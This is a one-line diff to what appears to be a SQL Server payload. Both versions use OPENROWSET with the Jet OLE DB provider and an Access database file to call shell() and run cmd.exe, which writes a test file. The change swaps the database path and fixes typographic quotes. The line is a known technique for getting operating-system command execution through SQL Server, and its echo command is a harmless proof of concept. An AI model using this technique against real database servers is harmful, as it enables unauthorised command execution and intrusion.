@@ -1,1 +1,1 @@
-select * from openrowset(‘microsoft.jet.oledb.4.0′,’;database=c:\windows\system32\ias\ias.mdb’,'select shell(“cmd.exe /c echo a&gt;c:\b.txt”)’)
+select * from openrowset('microsoft.jet.oledb.4.0',';database=C:\Windows\System32\LogFiles\Sum\Current.mdb','select shell("cmd.exe /c echo hello > c:\windows\temp\blah.txt")')
